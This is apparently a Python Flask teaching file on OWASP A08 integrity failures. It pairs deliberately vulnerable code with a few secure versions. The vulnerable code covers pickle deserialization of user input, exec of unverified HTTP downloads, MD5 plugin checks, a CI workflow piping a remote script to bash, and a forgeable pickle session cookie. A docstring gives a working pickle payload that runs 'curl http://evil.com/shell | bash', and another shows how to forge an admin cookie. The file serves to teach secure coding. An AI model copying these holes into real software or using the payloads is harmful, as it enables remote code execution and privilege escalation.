"""
OWASP A08:2021 - Software and Data Integrity Failures
⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT USE IN PRODUCTION
"""

import pickle
import json
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)


# ============================================================
# VULNERABILITY 1: Insecure deserialization (pickle)
# ============================================================

@app.route("/api/load-object", methods=["POST"])
def load_object_vulnerable():
    """
    BUG: Deserializing untrusted user-supplied pickle data.
    Pickle can call arbitrary Python during deserialization → RCE.

    Attack:
    import pickle, os, base64
    class Payload:
        def __reduce__(self):
            return (os.system, ('curl http://evil.com/shell | bash',))
    data = base64.b64encode(pickle.dumps(Payload())).decode()
    requests.post('/api/load-object', json={'data': data})
    """
    import base64
    raw = base64.b64decode(request.json["data"])
    obj = pickle.loads(raw)   # BUG: arbitrary code execution
    return jsonify({"result": str(obj)})


# ============================================================
# VULNERABILITY 2: Unsigned / unverified software updates
# ============================================================

def auto_update_vulnerable(update_url: str):
    """
    BUG: Downloads and executes an update script over HTTP with no
    signature verification. A MITM attacker can replace the script
    with malicious code.
    """
    import urllib.request
    # BUG: HTTP not HTTPS — susceptible to MITM
    # BUG: No checksum or signature verification before execution
    with urllib.request.urlopen(update_url) as resp:
        script = resp.read()
    # BUG: Executing downloaded code without any integrity check
    exec(script)   # noqa: S102


def download_plugin_vulnerable(plugin_url: str, expected_md5: str):
    """
    BUG: MD5 is cryptographically broken — collision attacks possible.
    An attacker can craft a malicious file with the same MD5.
    """
    import urllib.request
    import hashlib
    urllib.request.urlretrieve(plugin_url, "/tmp/plugin.tar.gz")
    with open("/tmp/plugin.tar.gz", "rb") as f:
        actual_md5 = hashlib.md5(f.read()).hexdigest()   # BUG: MD5 is broken
    if actual_md5 != expected_md5:
        raise ValueError("Checksum mismatch")
    subprocess.run(["tar", "-xzf", "/tmp/plugin.tar.gz", "-C", "/plugins"])


# ============================================================
# VULNERABILITY 3: Insecure CI/CD pipeline
# ============================================================

VULNERABLE_WORKFLOW = """
# .github/workflows/deploy.yml — VULNERABLE
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # BUG: Pins to a mutable tag, not a SHA — tag can be moved
      - uses: actions/checkout@v2

      # BUG: Runs arbitrary script from a third-party URL with no review
      - run: curl https://random-cdn.example.com/setup.sh | bash

      # BUG: Secret printed to logs
      - run: echo "Deploying with key ${{ secrets.DEPLOY_KEY }}"

      # BUG: All branches auto-deploy to production, no gate
      - run: ./deploy.sh production
"""


# ============================================================
# VULNERABILITY 4: Object deserialization in session cookie
# ============================================================

def decode_session_cookie_vulnerable(cookie: str) -> dict:
    """
    BUG: Session cookie is base64-encoded pickle, not signed.
    Attacker can forge arbitrary session data → privilege escalation.

    Forge admin session:
    import pickle, base64
    fake = pickle.dumps({"user_id": 1, "role": "admin"})
    cookie = base64.b64encode(fake).decode()
    """
    raw = base64.b64decode(cookie)
    return pickle.loads(raw)   # BUG: attacker controls role, permissions, etc.


# ============================================================
# VULNERABILITY 5: Trusting client-supplied 'role' field
# ============================================================

@app.route("/api/action", methods=["POST"])
def action_trust_client_role():
    """
    BUG: Role is read from the request body, not from the server-side session.
    Attacker sets role='admin' in the request and gains elevated access.
    """
    role = request.json.get("role")   # BUG: client controls this
    if role == "admin":
        return perform_admin_action()
    return jsonify({"status": "action performed"})


# ============================================================
# SECURE versions (for reference)
# ============================================================

import hashlib
import hmac
import secrets

def decode_session_cookie_secure(cookie: str, secret_key: str) -> dict:
    """CORRECT: Signed session cookie — tampering is detected."""
    try:
        payload_b64, sig = cookie.rsplit(".", 1)
        expected_sig = hmac.new(secret_key.encode(), payload_b64.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected_sig):
            raise ValueError("Invalid signature")
        return json.loads(base64.b64decode(payload_b64))
    except Exception:
        raise ValueError("Tampered or invalid session cookie")


def download_plugin_secure(plugin_url: str, expected_sha256: str):
    """CORRECT: SHA-256 + HTTPS ensures integrity and confidentiality."""
    import urllib.request
    # HTTPS only — rejects HTTP
    if not plugin_url.startswith("https://"):
        raise ValueError("Only HTTPS sources are allowed")
    urllib.request.urlretrieve(plugin_url, "/tmp/plugin.tar.gz")
    with open("/tmp/plugin.tar.gz", "rb") as f:
        actual_sha256 = hashlib.sha256(f.read()).hexdigest()
    if not hmac.compare_digest(actual_sha256, expected_sha256):
        raise ValueError("Integrity check failed — download aborted")
    subprocess.run(["tar", "-xzf", "/tmp/plugin.tar.gz", "-C", "/plugins"])


# --- Stubs ---
def perform_admin_action(): return jsonify({"status": "admin action"})
